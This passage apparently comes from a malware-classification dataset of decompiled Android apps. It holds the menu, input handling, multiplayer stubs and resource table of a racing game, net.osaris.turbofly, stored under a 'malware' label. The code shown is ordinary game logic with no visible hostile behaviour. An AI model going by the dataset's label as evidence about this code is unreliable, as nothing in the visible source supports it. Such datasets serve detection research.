this.circuit.texture=texture2;       }       this.circuit.draw(127,190);       if (Tracks.currentTrack > 0) {         sprites.drawSprite(""left"");       }       if ((milli > 500 || Tracks.currentTrack >= Tracks.nbTrackUnlocked - 1) && Tracks.currentTrack < Tracks.nbTracks - 1) {         sprites.drawSprite(""right"");       }       if (Tracks.currentTrack >= Tracks.nbTrackUnlocked && milli > 500) {         sprites.drawSprite(""lock"");       }       String number2=String.valueOf("""") + (Tracks.currentTrack + 1);       Text.draw(String.valueOf(number2) + ""."",48,150,24,1);       Text.draw(Tracks.trackNames[Tracks.currentTrack],120,150,24,3);       Text.draw(Messages.getString(R.string.MenuS104),450,290,24,1);       Text.draw(lScore,450,330,24,3);       if (Tracks.currentMode == 0) {         Text.draw(Messages.getString(R.string.MenuS105),450,160,24,1);         Text.draw(Messages.getString(R.string.MenuS106),450,200,20,3);         String finish4=Messages.getString(R.string.MenuS107);         Text.draw(finish4,450,230,20,3);         return;       }       if (Tracks.currentMode == 1) {         Text.draw(Messages.getString(R.string.MenuS108),450,160,24,1);         Text.draw(Messages.getString(R.string.MenuS109),450,200,20,3);         String finish5=Messages.getString(R.string.MenuS110);         Text.draw(finish5,450,230,18,3);         return;       }       if (Tracks.currentMode == 2) {         Text.draw(Messages.getString(R.string.MenuS114),450,160,24,1);         Text.draw(Messages.getString(R.string.MenuS115),450,200,20,3);         String finish6=String.valueOf("""") + Messages.getString(R.string.MenuS118);         Text.draw(finish6,450,230,20,3);         return;       }       return;     }     if (state == 13) {       drawMessage();     }   }   @Override public int getState(){     return state;   }   public void updateBest(){     nbUnlocked[0]=OsarisTools.getIntValue(""prog1"",1);     nbUnlocked[1]=Math.min((nbUnlocked[0] + 1) / 3,5);     bestmin=OsarisTools.getIntValue(""best"" + levelMode + ""min""+ InGame.circuitId,99);     bestsec=OsarisTools.getIntValue(""best"" + levelMode + ""sec""+ InGame.circuitId,99);   }   @Override public void surfaceCreated(){     if (!Text.initDone) {       Text.init(new Font(JumpyBall.COREAN ? ""NGEBS.ttf"" : ""font0.ttf""),new Font(JumpyBall.COREAN ? ""NGEBS.ttf"" : ""font0.ttf""));     }     this.vcap=new Sprite(8,32,""vcap.png"",true);     this.fond=new Sprite(JumpyBall.resX,JumpyBall.resY,""fond.jpg"");     ba=new Sprite(64,64,""ba.png"");     bb=new Sprite(64,64,""bb.png"");     this.haut=new Sprite(JumpyBall.resX,116,""menu.png"",true);     bouton=new Sprite(305,64,""bouton.png"",true);     sprites.put(""fond"",this.fond);     sprites.put(""top"",this.haut);     sprites.handleAnim(this.haut);     sprites.create(""bas"",""byosaris.png"",496,400,Segment.MAX_NBPOINTS,32,true,true);     sprites.create(""right"",""right.png"",370,202,64,64,true,true);     sprites.create(""left"",""left.png"",70,202,64,64,true,true);     sprites.create(""lock"",""lock.png"",203,210,96,96,true,true);     this.lock=sprites.get(""lock"");     this.bas=sprites.get(""bas"");     this.haut.state=1;     this.circuit=new Sprite(220,140,Tracks.trackTexture[Tracks.lvlTrack[0]],true);     this.circuit.texture=-1;     this.doitChargerCircuit=true;     cross[0]=new Sprite(10,40,""cross.png"",true);     cross[1]=new Sprite(11,48,""cross2.png"",true);     for (int i2=2; i2 < nbCrosses; i2++) {       cross[i2]=new Sprite(i2 + 10,(i2 * 8) + 40,cross[i2 % 2].texture,true);     }     for (int i3=0; i3 < nbCrosses; i3++) {       xCrosses[i3]=((int)(Math.random() * 700.0d)) - 100;       yCrosses[i3]=((int)(Math.random() * 1000.0d)) - 800;     }     int s=state;     state=1;     setState(s);     vaisseaux=new Vaisseau[5];     VaisseauFactory.loadShips();     i=0;     while (i < 5) {       vaisseaux[i]=VaisseauFactory.makeShip(i);       i++;     }   }   public void doTouchDown(  float x,  float y,  Context context){     selectedButon=-1;     if (x < 512.0f && y > 134.0f && y < 454.0f) {       selectedButon=(int)((y - 134.0d) / 80.0d);     }     if (x > 512.0f && y > 374.0f && y < 454.0f) {       selectedButon=6;     }   }   public void majSettingsTexts(){     menus[6][0]=Messages.getString(R.string.MenuS134);     menus[6][2]=Messages.getString(R.string.MenuS135);     if (InGame.cockpitView) {       menus[6][1]=Messages.getString(R.string.MenuS136);     }  else {       menus[6][1]=Messages.getString(R.string.MenuS137);     }     if (RokonAudio.singleton.isMuted()) {       menus[14][0]=Messages.getString(R.string.MenuS138);     }  else {       menus[14][0]=Messages.getString(R.string.MenuS139);     }     if (RokonMusic.musicOn) {       menus[14][1]=Messages.getString(R.string.MenuS140);     }  else {       menus[14][1]=Messages.getString(R.string.MenuS141);     }     if (OsarisTools.vibrate) {       menus[14][2]=Messages.getString(R.string.MenuS142);     }  else {       menus[14][2]=Messages.getString(R.string.MenuS143);     }     if (LOW_END_DEVICE) {       menus[6][3]=Messages.getString(R.string.MenuS144);     }  else {       menus[6][3]=Messages.getString(R.string.MenuS145);     }     if (JumpyBall.KEYONLY) {       menus[6][0]=""Sound"";       menus[6][2]="""";       menus[6][3]="""";       menus[14][2]="""";     }   }   public void doTouchUp(  float x,  float y,  Context context){     if (game == null) {       game=GLSurface.inGame;     }     if (state == 2) {       if (x < 180.0f && y > 170.0f && y < 305.0f && Tracks.currentTrack > 0) {         loadLevelInfo(Tracks.currentTrack - 1);         return;       }       if (x > 270.0f && x < 530.0f && y > 170.0f && y < 305.0f && Tracks.currentTrack < Tracks.nbTracks - 1) {         loadLevelInfo(Tracks.currentTrack + 1);         return;       }  else {         doAction(context);         return;       }     }     if (state == 1 || (state == 5 && x > 416.0f && y > 352.0f)) {       if (x > 416.0f && y > 352.0f) {         Intent i2=new Intent(""android.intent.action.VIEW"",Uri.parse(""http://www.osaris.net""));         ((Activity)context).startActivity(i2);         OsarisTools.exit();         return;       }       doAction(context);       return;     }     if (state == 4) {       if (x < 180.0f && y > 170.0f && y < 305.0f && InGame.vaisseau > 0) {         InGame.vaisseau--;         return;       }       if (x > 270.0f && x < 530.0f && y > 170.0f && y < 305.0f && InGame.vaisseau < 4) {         InGame.vaisseau++;         return;       }  else {         doAction(context);         return;       }     }     if (state != 10) {       doAction(context);       return;     }     if (x < 180.0f && y > 170.0f && y < 305.0f && Tracks.currentLvl > 0) {       loadLevelInfo(Tracks.currentLvl - 1);       return;     }     if (x > 270.0f && x < 530.0f && y > 170.0f && y < 305.0f && Tracks.currentLvl < Tracks.nbLvls - 1) {       loadLevelInfo(Tracks.currentLvl + 1);     }  else {       doAction(context);     }   }   public void doAction(  Context context){     if (state == 13) {       if (selectedButon == 3) {         setState(dialog.positiveState);       }     }  else     if (state == 6) {       if (selectedButon == 2) {         setState(15);       }  else       if (selectedButon == 0) {         setState(14);       }  else       if (selectedButon == 1) {         InGame.cockpitView=InGame.cockpitView ? false : true;         OsarisTools.setValue(""cockpitView"",InGame.cockpitView);       }  else       if (selectedButon == 3) {         if (LOW_END_DEVICE) {           LOW_END_DEVICE=false;         }  else {           LOW_END_DEVICE=true;         }         OsarisTools.setValue(""lowEnd"",LOW_END_DEVICE);       }       majSettingsTexts();     }  else     if (state == 14) {       if (selectedButon == 2) {         OsarisTools.vibrate=OsarisTools.vibrate ? false : true;         OsarisTools.setValue(""vibrate"",OsarisTools.vibrate);       }  else       if (selectedButon == 0) {         if (RokonAudio.singleton.isMuted()) {           RokonAudio.singleton.unmute();         }  else {           RokonAudio.singleton.mute();         }         OsarisTools.setValue(""soundOn"",RokonAudio.singleton.isMuted() ? false : true);       }  else       if (selectedButon == 1) {         if (RokonMusic.musicOn) {           RokonMusic.musicOn=false;           RokonMusic.stop();         }  else {           RokonMusic.musicOn=true;           RokonMusic.play(""menu.MP3"",true);         }         OsarisTools.setValue(""musicOn"",RokonMusic.musicOn);       }       majSettingsTexts();     }  else     if (state == 1) {       if (selectedButon == 3) {         setState(5);         if (JumpyBall.essai) {           final Activity context1=(Activity)context;           new AlertDialog.Builder(context).setMessage(String.valueOf(Messages.getString(R.string.MenuS153)) + Messages.getString(R.string.MenuS154)).setNegativeButton(Messages.getString(R.string.MenuS155),(DialogInterface.OnClickListener)null).setPositiveButton(Messages.getString(R.string.MenuS156),new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface c,            int e){               Intent i2=new Intent(""android.intent.action.VIEW"",Uri.parse(JumpyBall.fullURL));               context1.startActivity(i2);               OsarisTools.exit();             }           } ).show();         }       }  else       if (selectedButon == 2) {         setState(6);       }  else       if (selectedButon == 1) {         Tracks.mode=1;         if (JumpyBall.essai) {           show(new Dialog().setMessage(Messages.getString(R.string.MenuS158)).setNegativeButton(Messages.getString(R.string.MenuS159),state));         }  else {           setState(7);         }       }  else       if (selectedButon == 0) {         Tracks.mode=0;         Tracks.currentLvl=Math.min(Tracks.nbUnlocked - 1,Tracks.nbLvls - 1);         loadLevelInfo(Tracks.currentLvl);         setState(10);       }     }  else     if (state == 7) {       if (selectedButon >= 0 && selectedButon < 3) {         Tracks.currentMode=selectedButon;         setState(4);       }     }  else     if (state == 5) {       setState(1);     }  else     if (state == 4) {       if (selectedButon == 3) {         if (InGame.vaisseau >= Tracks.nbShipUnlocked) {           show(new Dialog().setMessage(Messages.getString(R.string.MenuS160)).setNegativeButton(Messages.getString(R.string.MenuS163),state));         }  else         if (Tracks.mode == 1) {           loadLevelInfo(Tracks.currentTrack);           setState(2);         }  else         if (Tracks.mode == 0) {           Tracks.currentMode=Tracks.lvlType[Tracks.currentLvl];           Tracks.currentTrack=Tracks.lvlTrack[Tracks.currentLvl];           Tracks.currentBaseship=Tracks.lvlBaseship[Tracks.currentLvl];           Tracks.currentLvlSpeed=Tracks.lvlSpeed[Tracks.currentLvl];           InGame.circuitId=Tracks.trackEnv[Tracks.lvlTrack[Tracks.currentLvl]];           launchGame(Tracks.currentMode);         }       }     }  else     if (state == 10) {       if (selectedButon == 3) {         if (Tracks.currentLvl >= Tracks.nbUnlocked) {           show(new Dialog().setMessage(Messages.getString(R.string.MenuS162)).setNegativeButton(Messages.getString(R.string.MenuS163),state));         }  else {           InGame.vaisseau=Tracks.lvlBaseship[Tracks.currentLvl];           setState(4);         }       }     }  else     if (state == 2) {       if (selectedButon == 3) {         if (Tracks.currentTrack >= Tracks.nbTrackUnlocked) {           show(new Dialog().setMessage(Messages.getString(R.string.MenuS164)).setNegativeButton(Messages.getString(R.string.MenuS165),state));         }  else {           Tracks.currentBaseship=InGame.vaisseau;           Tracks.currentLvlSpeed=1.05d;           InGame.circuitId=Tracks.trackEnv[Tracks.currentTrack];           launchGame(Tracks.currentMode);         }       }     }  else     if (state == 15 && selectedButon >= 0 && selectedButon < 4) {       if (selectedButon == 0) {         InGame.controlMode=0;       }  else       if (selectedButon == 1) {         InGame.controlMode=-1;       }  else       if (selectedButon == 2) {         InGame.controlMode=1;       }  else       if (selectedButon == 3) {         InGame.controlMode=2;       }       OsarisTools.setValue(""controlMode2"",InGame.controlMode);       setState(6);     }     if (selectedButon == 6) {       doBack();     }   }   public boolean doKeyDown(  int keyCode,  KeyEvent msg,  Context context){     if (keyCode == 82 && !JumpyBall.KEYONLY) {       new AlertDialog.Builder(context).setMessage(Messages.getString(R.string.GLSurfaceViewS0)).setNegativeButton(Messages.getString(R.string.GLSurfaceViewS1),(DialogInterface.OnClickListener)null).setPositiveButton(Messages.getString(R.string.GLSurfaceViewS2),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface c,        int e){           OsarisTools.exit(1000L);         }       } ).show();       return true;     }     if ((keyCode == 4 && !JumpyBall.KEYONLY) || keyCode == 9) {       doBack();       return true;     }     if ((!JumpyBall.KEYONLY && (keyCode == 62 || keyCode == 66 || keyCode == 23)) || keyCode == 8) {       if (state == 2 || state == 4 || state == 10 || state == 13) {         selectedButon=3;       }       doAction(context);       return true;     }     if (keyCode == 19 || keyCode == 38) {       int precedent=selectedButon != -1 ? selectedButon : 4;       for (int i2=-1; i2 < precedent; i2++) {         int b=(i2 + 4) % 4;         if (state < menus.length && b < menus[state].length && menus[state][b] != null && !menus[state][b].equals("""")) {           selectedButon=b;         }       }       return true;     }     if (keyCode == 20 || keyCode == 40) {       int precedent2=selectedButon == 6 ? -1 : selectedButon;       for (int i3=4; i3 > precedent2; i3--) {         int b2=(i3 + 4) % 4;         if (state < menus.length && b2 < menus[state].length && menus[state][b2] != null && !menus[state][b2].equals("""")) {           selectedButon=b2;         }       }       return true;     }     if (keyCode == 21 || keyCode == 29 || keyCode == 45 || keyCode == 37) {       if (state == 2 && Tracks.currentTrack > 0) {         loadLevelInfo(Tracks.currentTrack - 1);       }  else       if (state == 4 && InGame.vaisseau > 0) {         InGame.vaisseau--;       }  else       if (state == 10 && Tracks.currentLvl > 0) {         loadLevelInfo(Tracks.currentLvl - 1);       }       return true;     }     if (keyCode != 22 && keyCode != 44 && keyCode != 32 && keyCode != 54 && keyCode != 51 && keyCode != 39) {       return keyCode == 66;     }     if (state == 2 && Tracks.currentTrack < Tracks.nbTracks - 1) {       loadLevelInfo(Tracks.currentTrack + 1);     }  else     if (state == 4 && InGame.vaisseau < 4) {       InGame.vaisseau++;     }  else     if (state == 10 && Tracks.currentLvl < Tracks.nbLvls - 1) {       loadLevelInfo(Tracks.currentLvl + 1);     }     return true;   }   public static void launchGame(  int mode){     RokonMusic.stop();     InGame.state=4;     InGame.mode=mode;     GLSurface.state=2;   }   public void setState(  int s){     selectedButon=-1;     if (JumpyBall.KEYONLY) {       selectedButon=0;     }     if (s == 6 || s == 14) {       majSettingsTexts();     }     if (s != state) {       this.haut.state=1;       state=s;       if (state == 15) {         if (InGame.controlMode == 0) {           selectedButon=0;           return;         }         if (InGame.controlMode == -1) {           selectedButon=1;         }  else         if (InGame.controlMode == 1) {           selectedButon=2;         }  else {           selectedButon=3;         }       }     }   }   @Override public void setMatrix3D(){     super.setMatrix3D();     GLES10.glTranslatex(0,-163840,-131072);     GLES10.glRotatef(-170.0f,1.0f,0.0f,0.0f);     GLES10.glTranslatex(-101580,-111411,72089);   }   public void setMatrixMenu(){     super.setMatrix3D();     GLES10.glRotatef(InGame.anglePCX - 50.0f,1.0f,0.0f,0.0f);     GLES10.glRotatef((-169.0f) + InGame.anglePCY,0.0f,1.0f,0.0f);     GLES10.glRotatef(InGame.anglePCZ - 128.0f,0.0f,0.0f,1.0f);     GLES10.glTranslatef(InGame.movePCX,InGame.movePCY,0.8f + InGame.movePCZ);     if (JumpyBall.PC) {       JumpyBall.sysout1="" : "" + (InGame.anglePCX - 50.0f) + "" : ""+ ((-169.0f) + InGame.anglePCY)+ "" : ""+ (InGame.anglePCZ - 128.0f);       JumpyBall.sysout3="" : "" + InGame.movePCX + "" : ""+ InGame.movePCY+ "" : ""+ (0.8f + InGame.movePCZ);     }     GLES10.glScalef(0.01f,0.01f,0.01f);   }   public void doBack(){     if (state == 13) {       setState(dialog.negativeState);       return;     }     if (state == 1) {       OsarisTools.exit(1000L);       return;     }     if (state == 2) {       setState(4);       return;     }     if (state == 4) {       if (Tracks.mode == 1) {         setState(1);         return;       }  else {         if (Tracks.mode == 0) {           setState(10);           return;         }         return;       }     }     if (state == 7) {       setState(1);       return;     }     if (state == 14) {       setState(6);     }  else     if (state == 15) {       setState(6);     }  else {       setState(1);     }   }   public void load(){     RokonMusic.stop();     RokonMusic.play(""menu.MP3"",true);     if (InGame.eng != null) {       InGame.eng.stop();     }   }   public void loadLevelInfo(  int level){     int track;     if (Tracks.mode == 0) {       Tracks.currentLvl=level;       Tracks.currentMode=Tracks.lvlType[Tracks.currentLvl];       track=Tracks.lvlTrack[Tracks.currentLvl];     }  else {       Tracks.currentTrack=level;       track=Tracks.currentTrack;     }     this.doitChargerCircuit=true;     String bs=String.valueOf(""best"") + track;     int currentScore=OsarisTools.getIntValue(String.valueOf(String.valueOf(bs) + ""m"") + Tracks.currentMode,-1);     lScore="""";     if (currentScore == -1) {       lScore=String.valueOf(lScore) + Messages.getString(R.string.MenuS181);       return;     }     if (Tracks.currentMode == 2) {       lScore=String.valueOf(lScore) + currentScore;       return;     }     if (currentScore / 60 < 10) {       lScore=String.valueOf(lScore) + ""0"";     }     lScore=String.valueOf(lScore) + (currentScore / 60);     lScore=String.valueOf(lScore) + "":"";     if (currentScore % 60 < 10) {       lScore=String.valueOf(lScore) + ""0"";     }     lScore=String.valueOf(lScore) + (currentScore % 60);   }   public void show(  Dialog dialogue){     dialog=dialogue;     if (dialog.negativeState == 0) {       dialog.negativeState=state;     }     if (dialog.positiveState == 0) {       dialog.positiveState=state;     }     setState(13);   }   private static void drawMessage(){     for (int i2=0; i2 < 5; i2++) {       if (!"""".equals(dialog.lines[i2])) {         Text.draw(dialog.lines[i2],48,(i2 * 50) + 158,28,4);       }     }     if (!"""".equals(dialog.negative)) {       Text.draw(dialog.negative,560,398,26,selectedButon == 6 ? 1 : 0);       bouton.draw(451,376);       boolean z=JumpyBall.KEYONLY;     }     if (!"""".equals(dialog.positive)) {       Text.draw(dialog.positive,68,398,26,selectedButon != 3 ? 0 : 1);       bouton.draw(44,376);       boolean z2=JumpyBall.KEYONLY;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\Menu1.code","public class Menu1 extends Menu {   static int nbCrosses=120;   static int[] xCrosses=new int[nbCrosses];   static float[] yCrosses=new float[nbCrosses];   private static Sprite[] cross=new Sprite[nbCrosses];   public Menu1(  boolean useTranslucentBackground){     super(useTranslucentBackground);   }   @Override public void drawFrame(){     size=80;     time();     dec+=delta * 2.0f;     dec%=65536.0f;     GLES10.glClearColor(0.0f,0.0f,0.0f,1.0f);     initGL();     setMatrix3D();     GLES10.glBlendFunc(1,771);     GLES10.glLoadIdentity();     GLES10.glMatrixMode(5888);     GLES10.glRotatef((-90.0f) + InGame.anglePCX,1.0f,0.0f,0.0f);     GLES10.glRotatef(InGame.anglePCY - 180.0f,0.0f,1.0f,0.0f);     for (int i=20; i < nbCrosses; i++) {       GLES10.glRotatef((7200.0f / nbCrosses) * i,0.0f,1.0f,0.0f);       GLES10.glTranslatef(0.0f,0.0f,6.0f);       GLES10.glRotatef(-180.0f,0.0f,0.0f,1.0f);       GLES10.glTranslatef(0.0f,0.0f,0.8f);       GLES10.glScalef(0.01f,0.01f,0.01f);       float alpha=(yCrosses[i] + 1500.0f) / 2000.0f;       GLES10.glColor4f(alpha,alpha,alpha,alpha);       if (alpha > 0.5d) {       }       cross[i].draw(xCrosses[i] - 400,yCrosses[i] - 240.0f);       yCrosses[i]=(float)(r2[i] + ((60.0d + i) * delta * 0.4d));       if (yCrosses[i] > -200.0f) {         xCrosses[i]=(int)(Math.random() * 700.0d);         float[] fArr=yCrosses;         fArr[i]=fArr[i] - 1500.0f;       }       GLES10.glScalef(100.0f,100.0f,100.0f);       GLES10.glTranslatef(0.0f,0.0f,-0.8f);       GLES10.glRotatef(180.0f,0.0f,0.0f,1.0f);       GLES10.glTranslatef(0.0f,0.0f,-6.0f);       GLES10.glRotatef(((-7200.0f) / nbCrosses) * i,0.0f,1.0f,0.0f);     }     setMatrix2D();   }   @Override public void surfaceCreated(){     cross[0]=new Sprite(3,100,""cross3.png"",true);     cross[1]=new Sprite(4,106,""cross4.png"",true);     for (int i=2; i < nbCrosses; i++) {       cross[i]=new Sprite((i / 2) + 3,(i * 6) + 100,cross[i % 2].texture,true);     }     for (int i2=0; i2 < nbCrosses; i2++) {       xCrosses[i2]=(int)(Math.random() * 700.0d);       yCrosses[i2]=((int)(Math.random() * 1500.0d)) - 1800;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\Messages.code","public class Messages {   private static final Activity RESOURCE_BUNDLE=JumpyBall.instance;   private Messages(){   }   public static String getString(  int key){     try {       return RESOURCE_BUNDLE.getString(key);     }  catch (    Exception e) {       return ""!!"";     }   }   public static String getString(  int key,  Object arg){     try {       return RESOURCE_BUNDLE.getString(key,new Object[]{arg});     }  catch (    Exception e) {       return ""!!"";     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\Multiplayer.code","public class Multiplayer {   public static void send(  MultiplayerMessage message){   }   public static void receive(  MultiplayerMessage message){     if (message.type == 'P') {       MultiplayerAppliance.receive(message);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\MultiplayerAppliance.code","public class MultiplayerAppliance {   public static void prepareSend(){     Vaisseau vaisseau=InGame.player;     MultiplayerMessage message=vaisseau.message;     message.type='P';     message.playerId=(char)InGame.playerId;     message.lapsDone=(char)InGame.lapsDone;     message.sequence++;     if (message.playerId != 0) {       message.canStart=true;     }     message.missileLaunched=vaisseau.missileLaunched;     message.hasWeapon=(char)vaisseau.hasWeapon;     message.angle=vaisseau.angle;     message.angleX=vaisseau.angleX;     message.angleY=vaisseau.angleY;     message.angleZ=vaisseau.angleZ;     message.lastZ=InGame.lastZ;     message.vxb=vaisseau.vxb;     message.vyb=vaisseau.vyb;     message.vzb=vaisseau.vzb;     message.mTz=vaisseau.mTz;     message.yb=vaisseau.yb;     message.z=(short)vaisseau.z;     message.x=vaisseau.x;     Multiplayer.send(message);     message.ennemiHitId=(char)65535;   }   public static void receive(  MultiplayerMessage message){     if (message.playerId != InGame.playerId) {       if (InGame.paused && InGame.playerId == 0 && InGame.concurrents != null && InGame.concurrents.length > message.playerId) {         MultiplayerMessage serveurMessage=InGame.concurrents[0].message;         InGame.concurrents[message.playerId].message.canStart=message.canStart;         serveurMessage.canStart=true;         for (int i=1; i < InGame.nbPlayers; i++) {           serveurMessage.canStart=serveurMessage.canStart && InGame.concurrents[i].message.canStart;         }         if (serveurMessage.canStart) {           InGame.paused=false;           prepareSend();           Osaris2D3D.timec=System.currentTimeMillis();           Osaris2D3D.time=System.currentTimeMillis();         }       }       if (InGame.paused && message.playerId == 0 && message.canStart) {         InGame.paused=false;         Osaris2D3D.timec=System.currentTimeMillis();         Osaris2D3D.time=System.currentTimeMillis();       }       message.applied=false;       if (InGame.concurrents != null && InGame.concurrents.length > message.playerId && InGame.concurrents[message.playerId].message.sequence < message.sequence) {         InGame.concurrents[message.playerId].message=message;       }     }   }   public static void applyAll(){     for (int i=0; i < InGame.nbConcurrents; i++) {       if (!InGame.concurrents[i].isPlayer) {         apply(InGame.concurrents[i]);       }     }   }   public static void apply(  Vaisseau vaisseau){     MultiplayerMessage message=vaisseau.message;     if (!message.applied) {       message.applied=true;       vaisseau.angle=message.angle;       vaisseau.angleX=message.angleX;       vaisseau.angleY=message.angleY;       vaisseau.vxb=message.vxb;       vaisseau.vyb=message.vyb;       vaisseau.vzb=message.vzb;       vaisseau.mTz=message.mTz;       vaisseau.yb=message.yb;       if (vaisseau.z != (message.z + (message.lapsDone * Piste.tailleCircuit)) - (InGame.lapsDone * Piste.tailleCircuit)) {         vaisseau.nowOnZ((message.z + (message.lapsDone * Piste.tailleCircuit)) - (InGame.lapsDone * Piste.tailleCircuit));       }       vaisseau.x=message.x;       if (vaisseau.hasWeapon != Vaisseau.NONE && message.missileLaunched && message.hasWeapon == Vaisseau.NONE) {         vaisseau.launchWeapon();       }       vaisseau.hasWeapon=message.hasWeapon;       vaisseau.majRelXYZ();     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\MultiplayerMessage.code","public class MultiplayerMessage implements Serializable {   private static final long serialVersionUID=1;   public float angle;   public float angleX;   public float angleY;   public float angleZ;   public char hasWeapon;   public char lapsDone;   public float lastZ;   public float mTz;   public boolean missileLaunched;   public char playerId;   public char type;   public float vxb;   public float vyb;   public float vzb;   public float x;   public float yb;   public short z;   boolean applied=true;   public boolean canStart=false;   public char ennemiHitId=65535;   public int sequence=0; } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\R.code","public final class R { public static final class attr {   } public static final class drawable {     public static final int app_sugoku=0x7f020000;     public static final int app_sugoku0=0x7f020001;     public static final int app_sugoku1=0x7f020002;     public static final int app_sugoku2=0x7f020003;   } public static final class string {     public static final int GLSurfaceViewS0=0x7f030066;     public static final int GLSurfaceViewS1=0x7f030067;     public static final int GLSurfaceViewS13=0x7f030068;     public static final int GLSurfaceViewS15=0x7f030069;     public static final int GLSurfaceViewS17=0x7f03006a;     public static final int GLSurfaceViewS2=0x7f03006b;     public static final int GLSurfaceViewS21=0x7f03006c;     public static final int GLSurfaceViewS22=0x7f03006d;     public static final int GLSurfaceViewS26=0x7f03006e;     public static final int GLSurfaceViewS28=0x7f03006f;     public static final int GLSurfaceViewS29=0x7f030070;     public static final int GLSurfaceViewS3=0x7f030071;     public static final int GLSurfaceViewS37=0x7f030072;     public static final int GLSurfaceViewS38=0x7f030073;     public static final int GLSurfaceViewS39=0x7f030074;     public static final int GLSurfaceViewS4=0x7f030075;     public static final int GLSurfaceViewS49=0x7f030076;     public static final int GLSurfaceViewS5=0x7f030077;     public static final int GLSurfaceViewS50=0x7f030078;     public static final int GLSurfaceViewS51=0x7f030079;     public static final int GLSurfaceViewS52=0x7f03007a;     public static final int GLSurfaceViewS53=0x7f03007b;     public static final int GLSurfaceViewS8=0x7f03007c;     public static final int InGameS10=0x7f030008;     public static final int InGameS11=0x7f030009;     public static final int InGameS2=0x7f03000a;     public static final int InGameS3=0x7f03000b;     public static final int InGameS4=0x7f03000c;     public static final int InGameS5=0x7f03000d;     public static final int InGameS54=0x7f03000e;     public static final int InGameS55=0x7f03000f;     public static final int InGameS57=0x7f030010;     public static final int InGameS6=0x7f030011;     public static final int InGameS7=0x7f030012;     public static final int InGameS8=0x7f030013;     public static final int InGameS9=0x7f030014;     public static final int InGameSPosition=0x7f030015;     public static final int InGameSSpeedUnit=0x7f030016;     public static final int MenuS0=0x7f030017;     public static final int MenuS1=0x7f030018;     public static final int MenuS104=0x7f030019;     public static final int MenuS105=0x7f03001a;     public static final int MenuS106=0x7f03001b;     public static final int MenuS107=0x7f03001c;     public static final int MenuS108=0x7f03001d;     public static final int MenuS109=0x7f03001e;     public static final int MenuS11=0x7f03001f;     public static final int MenuS110=0x7f030020;     public static final int MenuS114=0x7f030021;     public static final int MenuS115=0x7f030022;     public static final int MenuS118=0x7f030023;     public static final int MenuS134=0x7f030024;     public static final int MenuS135=0x7f030025;     public static final int MenuS136=0x7f030026;     public static final int MenuS137=0x7f030027;     public static final int MenuS138=0x7f030028;     public static final int MenuS139=0x7f030029;     public static final int MenuS140=0x7f03002a;     public static final int MenuS141=0x7f03002b;     public static final int MenuS142=0x7f03002c;     public static final int MenuS143=0x7f03002d;     public static final int MenuS144=0x7f03002e;     public static final int MenuS145=0x7f03002f;     public static final int MenuS153=0x7f030030;     public static final int MenuS154=0x7f030031;     public static final int MenuS155=0x7f030032;     public static final int MenuS156=0x7f030033;     public static final int MenuS158=0x7f030034;     public static final int MenuS159=0x7f030035;     public static final int MenuS160=0x7f030036;     public static final int MenuS161=0x7f030037;     public static final int MenuS162=0x7f030038;     public static final int MenuS163=0x7f030039;     public static final int MenuS164=0x7f03003a;     public static final int MenuS165=0x7f03003b;     public static final int MenuS166=0x7f03003c;     public static final int MenuS167=0x7f03003d;     public static final int MenuS168=0x7f03003e;     public static final int MenuS169=0x7f03003f;     public static final int MenuS170=0x7f030040;     public static final int MenuS171=0x7f030041;     public static final int MenuS172=0x7f030042;     public static final int MenuS181=0x7f030043;     public static final int MenuS2=0x7f030044;     public static final int MenuS20=0x7f030045;     public static final int MenuS21=0x7f030046;     public static final int MenuS22=0x7f030047;     public static final int MenuS3=0x7f030048;     public static final int MenuS35=0x7f030049;     public static final int MenuS4=0x7f030062;     public static final int MenuS52=0x7f03004a;     public static final int MenuS53=0x7f03004b;     public static final int MenuS54=0x7f03004c;     public static final int MenuS55=0x7f03004d;     public static final int MenuS58=0x7f03004e;     public static final int MenuS59=0x7f03004f;     public static final int MenuS60=0x7f030050;     public static final int MenuS61=0x7f030051;     public static final int MenuS62=0x7f030052;     public static final int MenuS63=0x7f030053;     public static final int MenuS64=0x7f030054;     public static final int MenuS65=0x7f030055;     public static final int MenuS66=0x7f030056;     public static final int MenuS67=0x7f030057;     public static final int MenuS7=0x7f030058;     public static final int MenuS74=0x7f030059;     public static final int MenuS75=0x7f03005a;     public static final int MenuS76=0x7f03005b;     public static final int MenuS77=0x7f03005c;     public static final int MenuS79=0x7f03005d;     public static final int MenuS80=0x7f03005e;     public static final int MenuS81=0x7f03005f;     public static final int MenuS85=0x7f030060;     public static final int MenuS86=0x7f030061;     public static final int MenuS94=0x7f030063;     public static final int MenuS95=0x7f030064;     public static final int MenuS96=0x7f030065;     public static final int app_name=0x7f030000;     public static final int menu_easy=0x7f030005;     public static final int menu_hard=0x7f030007;     public static final int menu_medium=0x7f030006;     public static final int menu_pause=0x7f030003;     public static final int menu_resume=0x7f030004;     public static final int menu_start=0x7f030001;     public static final int menu_stop=0x7f030002;   } } "
